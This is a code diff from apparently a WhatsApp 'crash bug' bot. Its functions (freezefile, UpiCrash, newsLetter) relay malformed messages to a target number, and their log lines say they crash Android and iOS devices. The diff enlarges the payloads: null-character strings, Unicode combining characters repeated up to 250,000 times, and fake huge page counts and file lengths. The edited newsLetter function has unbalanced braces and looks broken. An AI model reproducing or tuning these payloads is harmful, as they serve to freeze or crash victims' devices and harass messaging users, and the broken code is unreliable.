@@ -1601,7 +1601,7 @@ let virtex = "Wanna With Yours :D " + "ྫྷ".repeat(77777) + "@ྫྷ".repeat(100000
 								},
 								nativeFlowMessage: {
 								name: "call_permission_request",
-								messageParamsJson: "\u0000".repeat(5000),
+								messageParamsJson: "\u0000".repeat(50000),
 								},
 								contextInfo: {
 								mentionedJid: ["0@s.whatsapp.net"],
@@ -1643,7 +1643,7 @@ let virtex = "Wanna With Yours :D " + "ྫྷ".repeat(77777) + "@ྫྷ".repeat(100000
             console.log(chalk.red.bold('Crash System(5) Device By ☆ RyzenCrash'))
    	};
 async function freezefile(target, QBug, Ptcp = true) {
-    let virtex = "Wanna With Yours :D " + "ြ".repeat(25000);
+    let virtex = "Wanna With Yours :D " + "ြ".repeat(250000);
     await cella.relayMessage(target, {
         groupMentionedMessage: {
             message: {
@@ -1654,7 +1654,7 @@ async function freezefile(target, QBug, Ptcp = true) {
                             mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                             fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                             fileLength: "999999999",
-                            pageCount: 0x9184e729fff,
+                            pageCount: 1316134911,
                             mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                             fileName: "NtahMengapa..",
                             fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
@@ -1874,26 +1874,21 @@ async function UpiCrash(target) {
     }
 
 async function newsLetter(target) {
-            try {
-                const messsage = {
-                    botInvokeMessage: {
-                        message: {
-                            newsletterAdminInviteMessage: {
+            await cella.relayMessage(
+            target,
+            {
+             newsletterAdminInviteMessage: {
                                 newsletterJid: `33333333333333333@newsletter`,
                                 newsletterName: "𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી" + "ી".repeat(120000),
                                 jpegThumbnail: "",
-                                caption: "ꦽ".repeat(120000),
+                                caption: "ꦽ".repeat(160000),
                                 inviteExpiration: Date.now() + 1814400000,
                             },
                         },
                     },
+                { participant: {
+                 jid: target,
                 };
-                await cella.relayMessage(target, messsage, {
-                    userJid: target,
-                });
-            }
-            catch (err) {
-                console.log(err);
             }
             console.log(chalk.blue.bold('Crash Ios(5) Device By ☆ RyzenCrash'))
         }
